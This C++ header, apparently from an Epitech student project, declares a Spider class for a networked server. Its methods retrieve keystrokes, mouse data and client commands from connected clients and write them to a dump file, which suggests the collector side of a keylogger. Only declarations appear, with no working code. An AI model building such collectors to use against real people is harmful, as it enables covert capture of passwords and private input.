//
// Spider.hh for epitech in /home/chapui_s/rendu/
//
// Made by chapui_s
// Login   <chapui_s@epitech.eu>
//
// Started on  Wed Oct 21 09:14:52 2015 chapui_s
// Last update Tue Oct 27 17:06:12 2015 bresci_b bresci_b
//

#ifndef SPIDER_H_
# define SPIDER_H_

# include <boost/shared_ptr.hpp>
# include <boost/enable_shared_from_this.hpp>
# include <boost/asio/spawn.hpp>
# include <string>
# include "ISocketEngine.hh"
# include "debug.hh"
# include "Buffer.hh"
# include "DumpFile.hh"
# include "IPlugin.hh"

# define PROTOCOL_VERSION	(1)
# define SIZE_STRING		(2048)

class	Web;

class					Spider : public boost::enable_shared_from_this<Spider>
{
private:
  boost::shared_ptr<ISocketEngine>	_socket;
  Web					&_web;
  char					_str[SIZE_STRING];
  Buffer				_buffer;

  uint16_t				_proto;
  std::string				_name;
  std::unique_ptr<DumpFile>		_dumpFile;

  std::list<boost::shared_ptr<IPlugin>>	&_listPlugins;

public:
  Spider(const boost::shared_ptr<ISocketEngine> &, Web &, std::list<boost::shared_ptr<IPlugin>> &);
  virtual ~Spider();

  boost::shared_ptr<ISocketEngine>	&getSocket();
  const std::string			&getName() const;

  void		prepareFirstConnection();
  void		doFirstConnection();
  void		dieInDignity();
  void		setName(uint16_t);
  void		getTypeInfo(boost::asio::yield_context);
  void		getKeystrokes(boost::asio::yield_context &);
  void		getMouse(boost::asio::yield_context &);
  void		getClientCMD(boost::asio::yield_context &);
};

#endif /* !SPIDER_H_ */
